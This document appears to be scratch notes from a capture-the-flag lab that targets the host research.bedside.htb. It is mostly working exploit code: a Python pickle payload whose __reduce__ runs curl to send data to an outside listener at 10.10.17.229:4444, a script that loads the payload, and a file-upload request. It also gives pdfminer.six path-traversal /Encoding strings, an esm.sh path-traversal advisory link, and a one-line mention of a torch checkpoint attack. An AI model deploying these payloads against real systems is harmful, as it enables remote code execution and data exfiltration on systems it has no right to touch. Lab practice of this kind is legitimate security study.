## Create 
```
import os
import pickle
import base64
import subprocess

class RCE:
    def __reduce__(self):
        return (
            subprocess.getoutput,
            ("curl 'http://10.10.17.229:4444?data=123'",)
        )

f = open('aa.png', 'rb')
img = f.read()
with open('test.pickle', 'wb') as f:
   #pickle.dump(img, f)
   #pickle.dump(img, f)
   payload = pickle.dumps(RCE())
   print(payload)

```

## load
```
import os
import pickle
import base64
import subprocess

with open("test.pickle", "rb") as f:
#with open("aa.png", "rb") as f:
	data = f.read()
	payload = pickle.loads(data)
	print(data)
```

## Upload just file
```
import requests

url = 'http://research.bedside.htb'
files = {'uploadFile': open('null2.zip', 'rb')}
#headers = {'Content-Type': 'application/json'}
#response = requests.post(url, files=files, headers=headers)
data={'key':'value'}
response = requests.post(url, data=data, files=files)

print(response.text)
```

### pdfminer.six malicious 
```
// /var/www/research.bedside.htb/uploads/malicious
/Encoding /#2Fvar#2Fwww#2Fresearch#2Ebedside#2Ehtb#2Fuploads#2Fmalicious
/Encoding /#2Fpdfs#2Fmalicious
```

## esm.sh path travelsal
https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r

Last is torch(monai) checkpoint 